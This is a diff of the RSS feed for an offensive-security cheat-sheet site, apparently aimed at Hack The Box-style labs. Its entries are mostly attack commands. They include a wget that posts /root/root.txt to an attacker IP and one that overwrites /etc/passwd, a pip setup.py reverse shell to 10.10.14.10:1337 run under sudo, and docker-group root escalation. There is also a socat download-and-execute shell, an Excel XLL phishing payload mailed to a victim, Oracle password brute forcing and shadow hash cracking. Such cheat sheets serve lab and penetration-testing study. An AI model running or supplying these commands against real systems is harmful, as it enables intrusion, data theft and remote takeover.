@@ -8,6 +8,13 @@
     <language>en-us</language>
     <atom:link href="https://tldrbins.github.io/index.xml" rel="self" type="application/rss+xml" />
     <item>
+      <title>Advance wget</title>
+      <link>https://tldrbins.github.io/advance_wget/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/advance_wget/</guid>
+      <description> Advance wget # Provide file with urls wget --input-file /root/root.txt # POST a file wget --post-file /root/root.txt http://10.10.14.10 # Overwrite a file wget http://10.10.14.10/passwd.txt -O /etc/passwd </description>
+    </item>
+    <item>
       <title>Apache</title>
       <link>https://tldrbins.github.io/apache/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -50,6 +57,13 @@
       <description>Simply Catch HTTP Request webhook.site&#xA;Catch HTTP Request and Host a Web Server serveo.net # Start a local HTTP server python3 -m http.server 3000 # Redirect http request to localhost:3000 ssh -R 80:localhost:3000 serveo.net ngrok Download ngrok&#xA;ngrok http 80 Note: ngrok free will show a warning message and require user accpet to proceed Note: Not good for XSS</description>
     </item>
     <item>
+      <title>CouchDB</title>
+      <link>https://tldrbins.github.io/couchdb/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/couchdb/</guid>
+      <description> Basic # Show all databases curl http://localhost:5984/_all_dbs # Show all databases (With Creds) curl http://user:password@localhost:5984/_all_dbs # Show all docs from database curl http://localhost:5984/DB_name/_all_docs # Show Entry curl http://localhost:5984/DB_name/ID_hash </description>
+    </item>
+    <item>
       <title>Curl</title>
       <link>https://tldrbins.github.io/advance_curl/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -82,7 +96,7 @@
       <link>https://tldrbins.github.io/docker/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/docker/</guid>
-      <description> Privesc Abuse docker group docker run -v /:/mnt -it bash bash ls /mnt/root </description>
+      <description> Privesc Abuse docker group # List images docker images # Mount host root filesystem docker run -v /:/mnt -it image_name bash # Check ls /mnt/root </description>
     </item>
     <item>
       <title>dotnet</title>
@@ -125,6 +139,13 @@
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/find/</guid>
       <description> Find files of type file find . -type f Find and Open find / -name test.txt -exec cat {} \; Find SUID bit set files find / -type f -user root \( -perm -4000 -o -perm -2000 \) 2&amp;gt;/dev/null -ls Find files owned by group find / -group adm 2&amp;gt;/dev/null | grep -v -e ^/proc Find files created between 1/1/2024 and 31/12/2024 find / -type f -newermt 2024-01-01 ! -newermt 2024-12-31 -ls 2&amp;gt;/dev/null </description>
+    </item>
+    <item>
+      <title>Finger Protocol</title>
+      <link>https://tldrbins.github.io/finger/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/finger/</guid>
+      <description>Basic # Check logged in users finger @10.10.11.10 # Check valid user finger user@10.10.11.10 Brute force usernames perl finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t 10.10.11.10 Note: finger-user-enum.pl</description>
     </item>
     <item>
       <title>Flask Cookie</title>
@@ -278,7 +299,7 @@
       <link>https://tldrbins.github.io/mysql_interactoin/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/mysql_interactoin/</guid>
-      <description> General Connect to mysql Database # Database unknown mysql -u user -h 10.10.11.10 -p # Database known mysql -u user -D db_name -h 10.10.11.10 -p Basic Commands # Show all databases show databases; # Choose database use db_name; # Show all tables show tables; # Show all entries in table_name select * from table_name; Update Entry # Update Entry Example UPDATE users set user_type=&amp;#39;Administrator&amp;#39; where email=&amp;#39;test@example.com&amp;#39;; </description>
+      <description>General Connect to mysql Database # Database unknown mysql -u user -h 10.10.11.10 -p # Database known mysql -u user -D db_name -h 10.10.11.10 -p # Execute query inline mysql -u user -D db_name -h 10.10.11.10 -pPassword -e &amp;#39;show tables;&amp;#39; Basic Commands # Show all databases show databases; # Choose database use db_name; # Show all tables show tables; # Show all entries in table_name select * from table_name; Update Entry # Update Entry Example UPDATE users set user_type=&amp;#39;Administrator&amp;#39; where email=&amp;#39;test@example.</description>
     </item>
     <item>
       <title>Mysql Privilege Escalation</title>
@@ -330,6 +351,13 @@
       <description> Connect to vpn sudo openvpn my_vpn.ovpn </description>
     </item>
     <item>
+      <title>Oracle Database</title>
+      <link>https://tldrbins.github.io/oracle/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/oracle/</guid>
+      <description>Tools sqlplus # Install sudo apt install oracle-instantclient-sqlplus # export LD_LIBRARY_PATH export LD_LIBRARY_PATH=/usr/lib/oracle/19.6/client64/lib${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH} # Check sqlplus -V ODAT (Oracle Database Attacking Tool) Download ODAT&#xA;# Install sudo apt install odat # Check odat --version Enum # SID enum (You only need one) odat sidguesser -s 10.10.11.10 # User/Password brute force odat passwordguesser -s 10.10.11.10 -d SID --accounts-file accounts.txt # Run all checks with creds as sysdba odat all -s 10.</description>
+    </item>
+    <item>
       <title>Padding Oracle</title>
       <link>https://tldrbins.github.io/padding_oracle/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -349,6 +377,13 @@
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/phishing/</guid>
       <description>Phishing with XLL (Excel) revshells.com&#xA;shell.c #include &amp;lt;windows.h&amp;gt; __declspec(dllexport) void __cdecl xlAutoOpen(void); void __cdecl xlAutoOpen() { // Triggers when Excel opens WinExec(&amp;#34;&amp;lt;PowerShell #3 Base64 Payload&amp;gt;&amp;#34;, 1); // Replace your payload } BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved ) { switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH: case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; } return TRUE; } Compile shell.c using Linux x86_64-w64-mingw32-gcc -fPIC -shared -o shell.xll shell.c -luser32 Send email with the malicious xll file swaks --to &amp;#34;victim@victim.</description>
+    </item>
+    <item>
+      <title>pip</title>
+      <link>https://tldrbins.github.io/pip/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/pip/</guid>
+      <description> Privesc #!/usr/bin/env python3 from setuptools import setup from setuptools.command.install import install import os import socket import subprocess class Exploit(install): def run(self): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((&amp;#34;10.10.14.10&amp;#34;,1337)) # CHANGE HERE os.dup2(s.fileno(),0) os.dup2(s.fileno(),1) os.dup2(s.fileno(),2) p = subprocess.call([&amp;#34;/bin/sh&amp;#34;, &amp;#34;-i&amp;#34;]) setup( cmdclass={ &amp;#34;install&amp;#34;: Exploit } ) # Run sudo pip install . </description>
     </item>
     <item>
       <title>POP3</title>
@@ -384,6 +419,13 @@
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/secretsdump/</guid>
       <description> Impacket Download Impacket&#xA;secretsdump With ntds.dit and SYSTEM hive impacket-secretsdump -ntds ntds.dit -system system.bin LOCAL </description>
+    </item>
+    <item>
+      <title>Shadow Hash Cracking</title>
+      <link>https://tldrbins.github.io/shadow_hash_cracking/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/shadow_hash_cracking/</guid>
+      <description> Shadow Hash Cracking # Prepare an unshadowed hashes file unshadow passwd.txt shadow.txt &amp;gt; unshadowed.txt john john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt hashcat hashcat -m 7400 unshadowed.txt /usr/share/wordlists/rockyou.txt --force --user </description>
     </item>
     <item>
       <title>SMB Enum</title>
@@ -468,6 +510,13 @@
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/upgrade_shell/</guid>
       <description>Upgrade Shell Check installed binary which sh which bash which python3 which python python python3 -c &amp;#39;import pty; pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39; #Ctrl-Z to send the process to background, then stty raw -echo; fg #After fg, press enter again, then export TERM=xterm-256color socat Download socat&#xA;# Start a local http server python3 -m http.server 80 # In our local Linux machine socat file:`tty`,raw,echo=0 tcp-listen:1337 # In target machine wget -q http://10.10.14.10/socat -O /tmp/socat &amp;amp;&amp;amp; chmod +x /tmp/socat &amp;amp;&amp;amp; /tmp/socat exec:&amp;#39;bash -li&amp;#39;,pty,stderr,setsid,sigint,sane tcp:10.</description>
+    </item>
+    <item>
+      <title>VNC</title>
+      <link>https://tldrbins.github.io/vnc/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/vnc/</guid>
+      <description>Basic # Connect vncviewer 127.0.0.1:5901 -passwd secret Note: secret is a cookie binary file</description>
     </item>
     <item>
       <title>Web Directory Enum</title>
